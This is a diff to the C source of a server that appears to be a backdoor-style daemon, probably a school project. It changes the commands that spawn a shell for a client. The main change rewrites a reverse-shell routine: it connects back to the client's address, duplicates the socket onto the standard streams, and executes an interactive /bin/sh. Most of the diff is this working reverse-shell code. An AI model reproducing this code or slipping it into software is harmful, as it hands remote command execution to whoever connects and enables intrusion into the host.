@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
-/*   Updated: 2018/08/28 06:30:47 by root             ###   ########.fr       */
+/*   Updated: 2018/08/30 03:55:17 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -40,7 +40,7 @@ void				serverShell(t_cl *client, t_cmd *cmds)
 {
 	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
 	clientWrite("Spawning shell...\n", client);
-	client->shell = spawnShell();
+	client->shell = spawnShell(client->fd);
 	(void)cmds;
 }
 
@@ -80,8 +80,10 @@ static int			serverConnectShell(t_cl *client, char *port)
 		serverLog("[ERRO] - %d: Failed to connect to %s:%s (%s)",
 				  client->fd, client->addr, port,
 				  (tmp) ? strerror(errno) : "No server found");
+		clientWrite("Failed...\n", client);
 		return -1;
 	}
+	serverLog("[CMDS] - Connection to %s:%s succeeded.", client->addr, port);
 	return fd;
 }
 
@@ -90,18 +92,18 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 	char			**options;
 	char			*port;
 	int				fd;
+	pid_t			pid;
 
-	options = mysplitwhitespaces(cmds->options);
-	port = (options && options[1]) ? options[1] : SERVER_PORT;
-	serverLog("[CMDS] - %d: Spawning reverse shell to %s on %s", client->fd, client->addr, port);
 	clientWrite("Spawning reverse shell...\n", client);
+	options = mysplitwhitespaces(cmds->options);
+	port = (options && options[1]) ? options[1] : SERVER_REMOTE_PORT;
+	serverLog("[CMDS] - %d: Spawning reverse shell on %s:%s", client->fd, client->addr, port);
 	fd = serverConnectShell(client, port);
-	if (fd != -1) {
-		serverLog("[CMDS] - Connection to %s on %s succeeded.", client->addr, port);
-		pid_t pid = fork();
+	mytabdel(&options);
+	if (fd >= 0) {
+		pid = fork();
 		if (pid == 0) {
 			struct rlimit	rlim;
-			char			*cmd[3];
 
 			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
 				rlim.rlim_max = 4096;
@@ -109,29 +111,24 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 				if (i != (size_t)fd)
 					close(i);
 			}
-			dup2(fd, STDIN_FILENO);
-			dup2(fd, STDOUT_FILENO);
-			dup2(fd, STDERR_FILENO);
-			cmd[0] = "/bin/sh";
-			cmd[1] = "-i";
-			cmd[2] = NULL;
-			execv(cmd[0], cmd);
+			dup(fd);
+			dup(fd);
+			dup(fd);
+			close(fd);
+			{
+				char *cmd[] = { "/bin/sh", "-i", NULL };
+				execvp(cmd[0], cmd);
+			}
 			exit(0);
-		}
-		close(fd);
-		if (pid > 0) {
-			serverLog("[INFO] - %d: Reverse SHELL %d launched.", client->fd, pid);
+		} else if (pid > 0) {
 			serverQuitClient(client, cmds);
 		} else {
-			clientWrite("Failed to fork a new shell\n$> ", client);
+			serverLog("[ERRO] - %d: Failed to fork a new shell", client->fd);
 		}
+		close(fd);
 	} else {
-		clientWrite("Failed to connect to server.\n$> ", client);
+		clientWrite("$> ", client);
 	}
-	for (char **ptr = options; ptr && *ptr; ptr++)
-		free(*ptr);
-	if (options)
-		free(options);
 }
 
 void			serverQuitClient(t_cl *client, t_cmd *cmds)
